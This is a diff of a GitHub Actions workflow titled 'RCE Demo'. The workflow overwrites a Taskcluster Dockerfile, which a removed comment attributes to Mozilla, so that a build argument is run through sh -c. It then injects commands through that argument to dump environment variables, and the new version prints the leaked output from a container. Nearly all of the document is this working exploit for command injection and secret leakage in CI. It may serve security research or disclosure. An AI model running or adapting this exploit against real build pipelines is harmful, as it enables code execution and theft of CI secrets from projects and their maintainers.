@@ -1,19 +1,25 @@
-name: RCE Demo  
-on: push  
+name: RCE Demo
+on: push
 
-jobs:  
-  hack:  
-    runs-on: ubuntu-latest  
-    steps:  
-      - uses: actions/checkout@v2  
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
 
-      - name: Exploit  
-        run: |  
-          # Overwrite Mozilla's Dockerfile  
-          echo -e "ARG PYTHON_VERSION\nFROM alpine:latest\nARG PYTHON_VERSION\nRUN sh -c \"\$PYTHON_VERSION\"" > taskcluster/docker/python/Dockerfile  
+      - name: Setup malicious Dockerfile
+        run: |
+          mkdir -p taskcluster/docker/python
+          echo 'FROM alpine:latest
+ARG PYTHON_VERSION
+RUN sh -c "\$PYTHON_VERSION"' > taskcluster/docker/python/Dockerfile
 
-          # Inject code to leak secrets  
-          docker build \  
-            --build-arg PYTHON_VERSION="echo HACKED && id && env > /proc/1/fd/1" \  
-            -t hacked \  
-            ./taskcluster/docker/python  
+      - name: Build with injected payload
+        run: |
+          docker build \
+            --build-arg PYTHON_VERSION="echo RCE_SUCCESS > /leak && env > /leak_env" \
+            -t hacked ./taskcluster/docker/python
+
+      - name: Run container and show leak
+        run: |
+          docker run --rm hacked sh -c 'cat /leak /leak_env || echo "No leak"'
